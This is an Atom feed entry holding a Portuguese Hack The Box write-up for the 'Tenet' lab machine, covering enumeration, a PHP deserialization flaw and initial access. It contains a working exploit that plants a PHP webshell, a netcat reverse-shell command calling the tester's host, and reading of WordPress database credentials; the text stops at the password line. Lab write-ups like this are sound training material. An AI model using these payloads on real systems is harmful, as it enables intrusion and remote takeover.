<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="pt-BR"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://davicruz.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://davicruz.com/" rel="alternate" type="text/html" hreflang="pt-BR" /><updated>2021-06-14T16:05:02-03:00</updated><id>https://davicruz.com/feed.xml</id><title type="html">Davi Cruz</title><subtitle>Just another Cybersecurity blog</subtitle><author><name>Davi Cruz</name></author><entry><title type="html">Hackthebox write-up: Tenet</title><link href="https://davicruz.com/writeup/2021/06/htb-tenet/" rel="alternate" type="text/html" title="Hackthebox write-up: Tenet" /><published>2021-06-12T13:00:00-03:00</published><updated>2021-06-12T13:00:00-03:00</updated><id>https://davicruz.com/writeup/2021/06/htb-tenet</id><content type="html" xml:base="https://davicruz.com/writeup/2021/06/htb-tenet/">&lt;p&gt;Olá pessoal!&lt;/p&gt;

&lt;p&gt;A máquina desta semana será &lt;strong&gt;Tenet&lt;/strong&gt;, outra máquina Linux classificada como mediana do &lt;a href=&quot;https://www.hackthebox.eu/&quot;&gt;Hack The Box&lt;/a&gt;, criada por &lt;a href=&quot;https://app.hackthebox.eu/users/94858&quot;&gt;egotisticalSW&lt;/a&gt;.&lt;!--more--&gt;&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Info&lt;/strong&gt;: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ogdM1De.png&quot; alt=&quot;HTB Tenet&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Antes de iniciar a resolução desta máquina, me chamou atenção a ilustração, a qual busquei e acabei encontrando sobre o quadrado Sator, onde temos um palíndromo com cinco palavras latinas: &lt;em&gt;SATOR&lt;/em&gt;, &lt;em&gt;AREPO&lt;/em&gt;, &lt;em&gt;TENET&lt;/em&gt;, &lt;em&gt;OPERA&lt;/em&gt; e &lt;em&gt;ROTAS&lt;/em&gt;, que em um conjunto formam um quadrado com as mesmas palavras sendo TENET a central. Muito possivelmente estas palavras poderão estar presentes em algum ponto da resolução desta máquina :smile:.&lt;/p&gt;

&lt;h2 id=&quot;enumeração&quot;&gt;Enumeração&lt;/h2&gt;

&lt;p&gt;Como de costume, iniciado com um quick scan &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para identificar os serviços publicados&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.223
Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;will be slower.
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-02-27 14:36 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.223
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.079s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;18.06 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;80tcp---serviço-http&quot;&gt;80/TCP - Serviço HTTP&lt;/h3&gt;

&lt;p&gt;Ao acessar esta página, notado que se trata da página default do Apache, logo iniciei uma enumeração de diretórios com o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; onde acabei encontrando alguns diretórios, dentre ele o &lt;strong&gt;wordpress&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.223/ &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; gobuster.txt &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php,txt,html
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:            http://10.10.10.223/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:        10
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes:   200,204,301,302,307,401,403
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:     gobuster/3.0.1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions:     php,txt,html
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:        10s
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2021/02/27 14:44:51 Starting gobuster
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
/index.html &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/users.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/wordpress &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Progress: 5055 / 220561 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.29%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;^C
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Keyboard interrupt detected, terminating.
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2021/02/27 14:48:08 Finished
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ao acessá-lo, notado que a página estava sem formatação, logo validando o código fonte vi que estava com os apontamentos para as imagens em &lt;strong&gt;tenet.htb&lt;/strong&gt;, o qual foi adicionado no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Após ajustado o dns, executado scan utilizando o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wpscan&lt;/code&gt;, onde foi possível enumerar a versão do Wordpress, no caso 5.6, e usuários &lt;strong&gt;protagonist&lt;/strong&gt; e &lt;strong&gt;neil&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Como ao acessar a página pela url &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.223/wordpress&lt;/code&gt; informa uma mensagem de erro, conforme imagem abaixo. Acessando a partir do dns configurado e conforme visto no codigo fonte (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://tenet.htb&lt;/code&gt;) para visualizar o site wordpress corretamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/u4M23iB.png&quot; alt=&quot;HTB Tenet - 80/TCP&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Analisando as postagens ao acessar o wordpress pelo DNS, notei que os posts mencionam um sistema chamado &lt;strong&gt;Rotas&lt;/strong&gt;, que possivelmente possa conter algum item a ser explorado e conseguir um acesso inicial&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;This Is Where Our Worlds Collide
We’re looking for beta testers of our new time-management software, ‘Rotas’
‘Rotas’ will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you! For more information regarding opting-in, watch this space.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As coisas ficam mais interessantes em um post mais antigo, onde o usuário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;neil&lt;/code&gt; comenta o seguinte na postagem:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Buscando por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sator.php&lt;/code&gt; no hostname &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tenet.htb&lt;/code&gt; não retornou nada, mas acessando diretamente ao IP do servidor, conforme acessado inicialmente, recebi a página abaixo:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/OOaRPfQ.png&quot; alt=&quot;HTB Tenet - sator.php&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Uma vez que backups são criados com sufixos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;old&lt;/code&gt; ou &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bak&lt;/code&gt;, acabei encontrando o arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sator.php.bak&lt;/code&gt; no mesmo diretório, onde pude listar o conteúdo abaixo:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DatabaseExport&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'users.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;update_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[+] Grabbing users from text file &amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Success'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__DIR__&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[] Database updated &amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;//    echo 'Gotta get this working properly...';&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'arepo'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$databaseupdate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DatabaseExport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;update_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como podemos ver este código é vulnerável a &lt;strong&gt;PHP Deserialization&lt;/strong&gt;, uma vez que não valida o input recebido via GET a partir do query string arg &lt;strong&gt;arepo&lt;/strong&gt;, permitindo que seja modificado o conteúdo do arquivo de banco de dados.&lt;/p&gt;

&lt;h2 id=&quot;acesso-inicial&quot;&gt;Acesso inicial&lt;/h2&gt;

&lt;p&gt;Para acesso inicial o primeiro passo é criar um dado serializado do PHP malicioso e enviar no argumento &lt;strong&gt;arepo&lt;/strong&gt; conforme vimos no metodo get. Buscando um pouco encontrei &lt;a href=&quot;https://github.com/1N3/Exploits/blob/master/PHP-Serialization-RCE-Exploit.php&quot;&gt;este exemplo de exploit&lt;/a&gt; que foi modificado para gerar um webshell simples na máquina, o qual poderia a posteriori ser utilizado para obter um shell reverso na máquina.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; 

&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DatabaseExport&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'shell.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;?php system($_GET[&quot;cmd&quot;]); ?&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;update_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[+] Grabbing users from text file &amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Success'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__DIR__&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[] Database updated &amp;lt;br&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;//    echo 'Gotta get this working properly...';&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://10.10.10.223/sator.php?arepo='&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$arepo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;urlencode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DatabaseExport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$arepo&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Após execução, foi possível validar o funcionamento do webshell com a chamada executando o comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;php exploit.php
&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; Database updated &amp;lt;br&amp;gt;[+] Grabbing &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;from text file &amp;lt;br&amp;gt;
&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; Database updated &amp;lt;br&amp;gt;[] Database updated &amp;lt;br&amp;gt;   

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; http://10.10.10.223/shell.php?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Confirmado o acesso, realizado chamada para um shell reverso utilizando o comando abaixo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data-urlencode&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.136 4443 &amp;gt;/tmp/f&quot;&lt;/span&gt; http://10.10.10.223/shell.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User Flag&lt;/h2&gt;

&lt;p&gt;Uma vez com acesso à máquina, já que era sabido que tínhamos um wordpress instalado, busquei pelo arquivo de configuração do wordpress onde pude obter as credenciais para acesso ao banco do usuário &lt;strong&gt;neil&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// ** MySQL settings - You can get this info from your web host ** //&lt;/span&gt;
&lt;span class=&quot;cd&quot;&gt;/** The name of the database for WordPress */&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DB_NAME'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'wordpress'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cd&quot;&gt;/** MySQL database username */&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DB_USER'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'neil'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cd&quot;&gt;/** MySQL database password */&lt;/span&gt;
